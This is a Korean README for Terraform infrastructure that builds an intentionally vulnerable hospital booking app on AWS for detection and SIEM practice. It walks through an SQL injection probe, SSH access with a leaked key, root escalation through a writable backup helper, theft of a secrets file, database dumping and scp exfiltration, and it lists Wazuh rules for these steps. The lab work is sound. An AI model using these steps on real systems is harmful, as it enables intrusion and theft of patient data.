# vuln-hospital-booking-infra

`vuln-hospital-booking` 앱을 위한 AWS 인프라를 Terraform으로 구성합니다.
SIEM/SOAR 실습을 위해 **의도적으로 취약하게** 구성된 환경이며, 공격 시뮬레이션 및 탐지 파이프라인 실습 용도입니다.

## 주의사항

- 이 인프라는 **보안 실습 전용**이며 프로덕션 사용을 금지합니다.
- GuardDuty, CloudTrail은 과금이 발생합니다 — 실습 후 반드시 `terraform destroy` 하세요.
- EC2 보안그룹의 `0.0.0.0/0` SSH 허용은 의도적 취약 설정입니다 (`modules/networking/main.tf` 참고).
- RDS는 VPC 내부에서만 접근 가능하며 퍼블릭 노출이 없습니다.

## 전제 조건

- Terraform >= 1.5.0
- AWS CLI 설정 완료 (`aws configure`)
- AWS 계정에 AdministratorAccess 권한
- 대상 리전: `ap-northeast-2` (서울)
- 사전에 생성된 EC2 SSH 키페어 이름

## 실행 순서

```bash
# 1. 초기화
terraform init

# 2. 계획 확인
terraform plan -var-file="terraform.tfvars"

# 3. 보안 모니터링 먼저 적용 (로그 수집 시작)
terraform apply -target=module.networking -target=module.security_monitoring

# 4. 앱 인프라 적용
terraform apply

# 5. 실습 종료 후 정리
terraform destroy
```

`terraform.tfvars`의 `key_pair_name`, `db_password`는 `<CHANGE_ME>`를 실제 값으로 교체한 뒤 실행하세요.

## 앱 배포 동작

- EC2 user_data가 `var.app_git_ref`(기본값 `main`, SQLi 실습 코드 + WAF/ModSecurity가 병합된 브랜치)를 clone하고, `docker-compose.yml`의 `DATABASE_URL`을 RDS 엔드포인트로 교체합니다.
- 운영 배포는 WAF/prod override를 포함해 실행합니다. RDS를 사용하므로 Compose의 `db` 서비스는 기동하지 않고 `web`, `waf`만 대상으로 올립니다.

```bash
docker compose \
  -f docker-compose.yml \
  -f docker-compose.waf.yml \
  -f docker-compose.prod.yml \
  up -d --build --no-deps web waf
```

- RDS가 연결 가능해질 때까지 최대 5분 대기한 뒤 `flask init-db`/`seed-db`를 자동 실행하므로, `terraform apply` 완료 후 EC2 퍼블릭 IP로 바로 접속해 실습 계정으로 로그인할 수 있습니다(부팅+시드까지 수 분 소요).

## 운영 재배포 및 검증

기존 EC2에서 수동 재배포가 필요하면 `/opt/app`에서 아래처럼 실행합니다.

```bash
docker compose down
docker compose -f docker-compose.yml -f docker-compose.waf.yml -f docker-compose.prod.yml up -d --build --no-deps web waf
docker compose -f docker-compose.yml -f docker-compose.waf.yml -f docker-compose.prod.yml exec web flask --app run init-db
docker compose -f docker-compose.yml -f docker-compose.waf.yml -f docker-compose.prod.yml exec web flask --app run seed-db
```

WAF 동작과 직접 포트 차단은 아래 요청으로 확인합니다.

```bash
curl -I http://<EC2_PUBLIC_IP>/
curl -i "http://<EC2_PUBLIC_IP>/api/doctors/search?q=%27%20OR%201%3D1--"
curl -I --connect-timeout 3 http://<EC2_PUBLIC_IP>:5001/
nc -vz -w 3 <EC2_PUBLIC_IP> 5433
```

SQLi 요청은 `403 Forbidden`과 `X-Request-ID`가 포함된 커스텀 차단 페이지가 기대값입니다.

## 유출 SSH 키 기반 EC2 침해 실습

이 인프라는 앱 EC2에 유출 SSH 키 시나리오용 `deploy` 계정과 의도적으로 취약한 root 백업 작업을 함께 구성합니다.

구성 요소:

- `deploy` 계정: `ssh/vuln-hospital-lab.pem` 키로 접속 가능, `hospital-ops` 그룹 소속
- `/etc/systemd/system/hospital-db-backup.timer`: root 권한으로 15분마다 백업 서비스 실행
- `/usr/local/sbin/hospital-db-backup.sh`: root 소유 백업 스크립트
- `/opt/hospital/bin/hospital-backup-helper`: root 백업 스크립트가 호출하지만 `hospital-ops` 그룹에 쓰기 권한이 있는 취약 헬퍼
- `/etc/vuln-hospital-booking/app.env`: root만 읽을 수 있는 DB/S3 앱 설정
- auditd/Wazuh FIM: 정찰 명령, 백업 경로 조사, 헬퍼 변조, root 표식 파일, 설정 복사, 수집/압축/전송/삭제 행위 감시

초기 접근:

```bash
ssh -i ssh/vuln-hospital-lab.pem deploy@<APP_EC2_PUBLIC_IP>
```

정찰 및 취약 경로 확인:

```bash
whoami
id
groups
sudo -l
hostname
uname -a
ip addr
docker compose ps
systemctl list-timers --all
systemctl cat hospital-db-backup.timer
systemctl cat hospital-db-backup.service
ls -l /usr/local/sbin/hospital-db-backup.sh
ls -ld /opt/hospital/bin
ls -l /opt/hospital/bin/hospital-backup-helper
namei -l /opt/hospital/bin/hospital-backup-helper
```

권한 상승 검증용 헬퍼 변조 예시:

```bash
cp /opt/hospital/bin/hospital-backup-helper /opt/hospital/bin/hospital-backup-helper.orig
cat > /opt/hospital/bin/hospital-backup-helper <<'EOF'
#!/usr/bin/env bash
set -euo pipefail
mkdir -p /tmp/wazuh-edr-lab
id > /tmp/wazuh-root-proof
cp /etc/vuln-hospital-booking/app.env /tmp/wazuh-edr-lab/app.env
chmod 644 /tmp/wazuh-root-proof /tmp/wazuh-edr-lab/app.env
exec /opt/hospital/bin/hospital-backup-helper.orig
EOF
chmod 775 /opt/hospital/bin/hospital-backup-helper
```

다음 타이머 실행까지 남은 시간을 확인한 뒤 기다립니다.

```bash
systemctl list-timers hospital-db-backup.timer
```

검증 파일:

```bash
cat /tmp/wazuh-root-proof
cat /tmp/wazuh-edr-lab/app.env
```

DB 조회와 수집/압축/전송 테스트는 실습용 더미 데이터만 대상으로 수행합니다.

```bash
set -a
. /tmp/wazuh-edr-lab/app.env
set +a
mkdir -p /tmp/wazuh-edr-lab-collection
PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
  -c "\\copy (select id, username, full_name, email, role from users) to '/tmp/wazuh-edr-lab-collection/users.csv' csv header"
PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
  -c "\\copy (select id, status, reason, created_at from appointments) to '/tmp/wazuh-edr-lab-collection/appointments.csv' csv header"
PGPASSWORD="$DATABASE_PASSWORD" psql -h "$DATABASE_HOST" -U "$DATABASE_USER" -d "$DATABASE_NAME" \
  -c "\\copy (select id, title, document_type, classification, file_path from medical_documents) to '/tmp/wazuh-edr-lab-collection/medical_documents.csv' csv header"
tar -czf /tmp/wazuh-edr-lab-collection.tar.gz -C /tmp wazuh-edr-lab-collection
```

외부 수집 서버가 있을 때만 반출 이벤트를 생성합니다.

```bash
scp /tmp/wazuh-edr-lab-collection.tar.gz <collector_user>@<collector_ip>:/tmp/
```

주요 커스텀 Wazuh 룰 ID:

- `100170`: 계정/시스템 정찰 명령
- `100171`: 백업 타이머 및 root 서비스 조사
- `100172`: `/opt/hospital/bin/hospital-backup-helper` FIM 변경
- `100173`: `/tmp/wazuh-root-proof` root 권한 표식
- `100174`: root 전용 앱 설정 접근 또는 `/tmp` 스테이징
- `100175`: PostgreSQL 데이터 조회/수집
- `100176`: `/tmp` 수집 데이터 압축
- `100177`: `scp`, `curl`, `nc` 기반 반출 시도
- `100178`: 수집물 또는 셸 히스토리 삭제 시도
- `100179`: root 표식 이후 민감 설정 접근 상관분석
